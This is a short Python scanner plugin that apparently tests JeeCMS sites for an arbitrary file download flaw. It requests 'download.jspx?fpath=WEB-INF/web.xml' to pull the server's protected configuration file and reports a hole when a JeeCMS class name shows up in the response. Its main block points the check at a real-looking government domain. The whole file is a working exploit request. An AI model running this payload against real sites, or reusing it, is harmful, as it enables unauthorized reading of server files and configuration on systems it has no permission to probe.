#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Author:judger
#SerType:jeecms arbitrary file download
def assign(service, arg):
	if service == "jeecms":
		return True, arg

def audit(arg):
	payload = "download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml"
	url = arg + payload
	code, head, body, errcode, _url = curl.curl2(url)
	if code == 200 and 'com.jeecms.common.web.ProcessTimeFilter' in body:
		security_hole('Arbitrary file download:'+url)

if __name__ == '__main__':
	from dummy import *
	audit(assign('jeecms', 'http://www.xxczj.gov.cn/')[1])